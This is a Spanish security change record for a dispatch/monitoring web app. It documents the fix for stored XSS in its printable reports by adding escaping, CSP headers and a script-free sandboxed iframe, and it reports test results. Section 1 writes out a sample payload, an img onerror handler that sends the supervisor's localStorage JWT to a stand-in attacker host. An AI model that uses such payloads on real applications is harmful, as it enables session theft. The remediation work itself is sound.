# Incremento D-150 — XSS almacenado en los documentos imprimibles (H-06)

| Campo | Valor |
|---|---|
| Origen | **H-06** del `INFORME_OPTIMIZACION_V2.md` (ALTA) |
| Fecha | 2026-10-21 |
| Alcance | Backend + web · sin cambios de esquema ni de APK |
| Autor | Dirección del proyecto |

---

## 1. El defecto

Los reportes imprimibles se arman concatenando HTML con datos que escribe el
usuario, y el navegador los inyectaba con `document.write` en una pestaña del
**mismo origen**.

| Endpoint | Estado previo |
|---|---|
| `GET /despachos/{id}/imprimible` | **sin escapar**: `id_averia`, `direccion`, `nombre_cliente`, `telefono`, `contacto_cliente`, `problema_reporte`, sector, cuadrilla y estado |
| `GET /reportes/trabajo/imprimible` | **sin escapar**: nombre/código de central, nombre/código de cuadrilla, identificadores de pago |
| `GET /fallas-masivas/{id}/reporte` | escapaba `<`, `>` y `&` con un helper local, pero no comillas |

El camino de explotación era: un usuario con permiso de alta guarda
`<img src=x onerror="fetch('//atacante?t='+localStorage.ggto_token)">` en el
nombre del cliente o en la dirección; cuando un supervisor abre la ficha
imprimible, el script corre con el origen de la aplicación y **roba el JWT**
(que vive en `localStorage`), es decir, la sesión del supervisor.

Las tres pantallas de la web (`Despacho`, `Masivas` y `Monitoreo`) abrían una
pestaña con `window.open('', '_blank')` y `document.write(html)`; esa pestaña
hereda el origen de la aplicación, por lo que el `sandbox` del navegador no
intervenía.

---

## 2. Corrección

### 2.1 Escapado en el servidor

Nuevo módulo `app/core/html.py` con `escapar(valor, defecto="—")`, que usa
`html.escape(..., quote=True)`: neutraliza `<`, `>`, `&`, `"` y `'`, así que
sirve tanto para el texto de una celda como para un atributo. Los tres endpoints
lo aplican a **todo** valor dinámico.

### 2.2 Cabeceras defensivas

Los tres documentos responden con:

```
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline';
                         img-src data:; base-uri 'none'; form-action 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
```

Aunque un valor se colara sin escapar, el navegador no ejecutaría JavaScript.

### 2.3 Iframe aislado en la web

Nuevo `app/web/src/utils/imprimir.ts`: el HTML se renderiza en un `iframe` con
`sandbox="allow-same-origin allow-modals"` y **sin `allow-scripts`**. El
contenido no puede ejecutar scripts, pero el padre (de confianza) lanza la
impresión con `contentWindow.print()`. El iframe se maqueta fuera de la vista
con tamaño carta (816 × 1056 px) y se retira al cerrar el diálogo
(`afterprint`, con respaldo a los 5 minutos).

Se eliminó `document.write` de `Despacho.tsx`, `Masivas.tsx` y `Monitoreo.tsx`.
El botón «Imprimir» que traía el HTML queda inerte (los scripts están
bloqueados); ahora el diálogo se abre automáticamente al cargar el documento.

---

## 3. Verificación

| Comprobación | Resultado |
|---|---|
| Unidad de `escapar` y cabeceras (`test_h06_imprimibles.py`) | **4 passed** |
| Integración: despacho con `<script>` e `<img onerror>` guardados | **passed**: el HTML devuelve `&lt;script&gt;…` y no el marcado |
| Integración: reporte de masiva con `<script>` en la descripción | **passed**: escapado y con CSP |
| Integración: reporte de trabajo (cabeceras) | **passed** |
| Regresión D-94 del informe imprimible | **passed** |
| Conjunto seleccionado contra PostgreSQL 18 (`ggto_h06`, eliminado al terminar) | **5 passed** (3m13s + 44s) |
| Suite sin base | **115 passed, 439 skipped** |
| Ruff | `All checks passed!` |
| Web | `tsc --noEmit` limpio |

---

## 4. Cambios por archivo

| Archivo | Cambio |
|---|---|
| `app/core/html.py` | **Nuevo**: `escapar` y `CABECERAS_IMPRIMIBLE`. |
| `app/api/routes_despachos.py` | Escapa la ficha del despacho y añade cabeceras. |
| `app/api/routes_monitoreo.py` | Escapa el reporte de trabajo y añade cabeceras. |
| `app/api/routes_alertas.py` | Usa `escapar` en el reporte de masiva y añade cabeceras. |
| `app/web/src/utils/imprimir.ts` | **Nuevo**: impresión en iframe aislado. |
| `app/web/src/pages/Despacho.tsx`, `Masivas.tsx`, `Monitoreo.tsx` | Sin `document.write`; usan `imprimirHtml`. |
| `app/tests/test_h06_imprimibles.py` | **Nuevo**: 4 pruebas de unidad. |
| `app/tests/test_despacho_api.py`, `test_monitoreo_api.py`, `test_alertas_api.py` | Pruebas de escapado y cabeceras. |

---

## 5. Residuales

1. **El JWT sigue en `localStorage`.** Este incremento elimina el vector
   conocido, pero cualquier otro XSS podría leerlo. Pasarlo a una cookie
   `HttpOnly` + `SameSite` es un cambio de arquitectura (M) que conviene evaluar
   en la revisión de H-01/H-06.
2. **Estilo en línea:** la CSP permite `style-src 'unsafe-inline'` porque los
   reportes llevan su `<style>` embebido; no permite scripts.
3. El botón «Imprimir» interno queda inerte por diseño; la impresión la dispara
   la aplicación.
